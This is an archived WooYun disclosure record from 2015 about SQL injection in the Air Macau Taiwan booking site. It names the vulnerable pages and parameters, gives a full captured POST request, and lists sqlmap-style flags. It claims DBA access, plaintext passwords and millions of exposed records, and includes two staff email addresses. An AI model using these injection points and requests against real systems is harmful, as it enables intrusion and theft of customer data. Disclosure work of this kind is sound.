{"id": 33684, "wybug_id": "wooyun-2015-0108258", "wybug_title": "澳门航空多处存在注入（DBA权限+密码明文+几百万数据信息泄漏）之三", "wybug_corp": "Hitcon台湾互联网漏洞报告平台", "wybug_author": "路人甲", "wybug_date": "2015-04-21 15:08", "wybug_open_date": "2015-04-26 15:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(Hitcon台湾互联网漏洞报告平台)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-26：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 好不容易又找到了一个，貌似很多都不行了，突然之间，难道开始修复了？不过也不会那么轻易找到了吧！~~~ 详细说明：  1、参考澳门航空，几个月前就像测试了，但是一直只看国内的航空，没有测试，搜索乌云发现 WooYun: 澳门航空某站4处SQL注入漏洞  WooYun: 澳门航空某站SQL注射  WooYun: 澳门航空分站SQL全站数据泄露（泄漏用户信息）  WooYun: 澳门航空某站SQL注入漏洞(明文密码)  WooYun: 澳门航空12处SQL注入漏洞大礼包  WooYun: 澳门航空某站一处SQL注入漏洞泄露大量信息  WooYun: 澳门航空某站SQL注入一枚  WooYun: 澳门航空某站又一处SQL注入漏洞成功登录后台+敏感信息泄露 已经有很多大牛提交了！~~~自己也提交了两个，但只审核了2 WooYun: 澳门航空多处存在注入（DBA权限+密码明文+几百万数据信息泄漏）之二 下面这个还在审核 WooYun: 澳门航空多处存在注入（DBA权限+密码明文+几百万数据信息泄漏） 2、多个注入点，先测试第一个，比较慢地址：\nhttp://www.airmacau.com.tw/tripinfo/triporder_new.asp?title=澳航假期-澳門2天1夜省錢族專案(3-12月)-(TPE台北出發)&mail=jowu@airmacau.com.tw;robynhsu@airmacau.com.tw&id=284\n然后填写抓包======================================\nhttp://www.airmacau.com.tw/tripinfo/triporder_new.asp (POST)bName=wooyun&bPhone=13888888888&bMail=wooyun@163.com&bhotel=KK&bpeople=2&fyear=2015&fmonth=3&fday=8&bCont=test&number=7808L&Input=%BDT%BB{%B0e%A5X&btitle=%B0%C4%BA%BD%BC%D9%C6%DA-%B0%C4%E9T2%CC%EC1%D2%B9%CA%A1%E5X%D7%E5%8C%A3%B0%B8(3-12%D4%C2)-(TPE%CC%A8%B1%B1%B3%F6%B0l)&amail=jowu@airmacau.com.tw%3Brobynhsu@airmacau.com.tw&id=284\n======================================同样根据大牛的渗透，知道服务器为\"Microsoft SQL Server 2005\"那么直接加上参数 --dbms \"Microsoft SQL Server 2005\" --current-db --current-user下面就直接贴图了吧！~~~同样DBA权限，数据密码明文，几百万数据信息都可以泄漏\n\n\n\n\n\n\n\n因为已经测试过，而且这个比较慢，要网速好，不收影响才能好好测试，否则一个读取一个字符都不知道要多久。用上次测试的数据，就不再重复注入了！~~~\n\n\n\n\n\n\n\n\n\n\n\n3、第二个注入点\nhttp://www.airmacau.com.tw/bpbonus/bpbonus_detail.asp?seq=143\nseq存在注入，不过这个与\nhttp://www.airmacau.com.tw/holidays/hotel_detail.asp?route=mfm&seq=9\n不一样的是权限不是DBA，难道还不一样？还是姿势问题？既然权限不大也就不继续，而且DBA权限已经测试过一些数据库，就不重复dump了\n\n\n\n结合注入一，众多的数据，给出权限这么大，进入后台也是明文，可以查看每个数据库的数据了！~~~   漏洞证明：  如上，就不多说了   修复方案：  过滤修复你们比我专业   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-04-26 15:10 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}